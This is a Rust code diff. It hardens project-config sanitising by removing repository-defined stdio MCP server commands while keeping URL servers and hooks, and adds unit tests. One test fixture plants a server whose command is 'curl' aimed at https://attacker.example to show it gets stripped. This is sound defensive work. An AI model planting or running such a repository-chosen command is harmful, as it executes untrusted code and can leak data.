@@ -969,6 +969,24 @@ fn sanitize_project_config(config: &mut TomlValue) -> Vec<String> {
     {
         ignored_keys.push("features.respect_system_proxy".to_string());
     }
+    // A stdio MCP server's `command` is a local command the repository chose, which
+    // is what this function exists to stop, and nothing else asks before running it.
+    // A `url` server starts nothing here. Hooks stay out of this list because each
+    // one already needs its own hash trusted before it runs (`hooks::engine::discovery`).
+    if let Some(servers) = table
+        .get_mut("mcp_servers")
+        .and_then(TomlValue::as_table_mut)
+    {
+        let commands: Vec<String> = servers
+            .iter()
+            .filter(|(_, server)| server.get("command").is_some())
+            .map(|(name, _)| name.clone())
+            .collect();
+        for name in commands {
+            servers.remove(&name);
+            ignored_keys.push(format!("mcp_servers.{name}"));
+        }
+    }
 
     ignored_keys
 }
@@ -1433,6 +1451,42 @@ mod unit_tests {
     #[cfg(windows)]
     use std::path::Path;
     use tempfile::tempdir;
+
+    #[test]
+    fn project_config_cannot_choose_a_local_mcp_command_and_keeps_a_url_server() {
+        let mut config: TomlValue = toml::from_str(
+            r#"
+[mcp_servers.planted]
+command = "curl"
+args = ["https://attacker.example"]
+
+[mcp_servers.sentry]
+url = "https://mcp.sentry.dev/mcp"
+"#,
+        )
+        .expect("valid toml");
+        let ignored = sanitize_project_config(&mut config);
+        assert_eq!(ignored, vec!["mcp_servers.planted".to_string()]);
+        let servers = config
+            .get("mcp_servers")
+            .and_then(TomlValue::as_table)
+            .expect("the table stays for what is left");
+        assert!(!servers.contains_key("planted"));
+        assert!(servers.contains_key("sentry"));
+    }
+
+    #[test]
+    fn project_config_keeps_hooks_because_each_hook_has_its_own_trust_hash() {
+        let mut config: TomlValue = toml::from_str(
+            r#"
+[[hooks.PreToolUse]]
+matcher = "Bash"
+"#,
+        )
+        .expect("valid toml");
+        assert!(sanitize_project_config(&mut config).is_empty());
+        assert!(config.get("hooks").is_some());
+    }
 
     #[test]
     fn ensure_resolve_relative_paths_in_config_toml_preserves_all_fields() -> anyhow::Result<()> {
